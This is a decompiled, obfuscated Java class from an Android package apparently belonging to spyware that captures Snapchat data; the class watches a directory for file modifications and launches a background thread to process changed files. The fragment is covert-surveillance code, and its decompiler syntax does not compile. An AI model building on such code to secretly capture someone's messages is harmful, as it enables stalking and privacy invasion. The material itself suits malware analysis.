package com.vvt.capture.snapchat.a;

import android.os.FileObserver;
import java.io.File;

class f
  extends FileObserver
{
  private Thread b = null;
  private String c;
  private File d;
  
  public f(a parama, String paramString)
  {
    super(paramString, 2);
    this.c = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    boolean bool = a.d();
    if (bool) {}
    Thread localThread = this.b;
    if (localThread == null)
    {
      localThread = new java/lang/Thread;
      g localg = new com/vvt/capture/snapchat/a/g;
      localg.<init>(this, paramString);
      localThread.<init>(localg);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/a/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */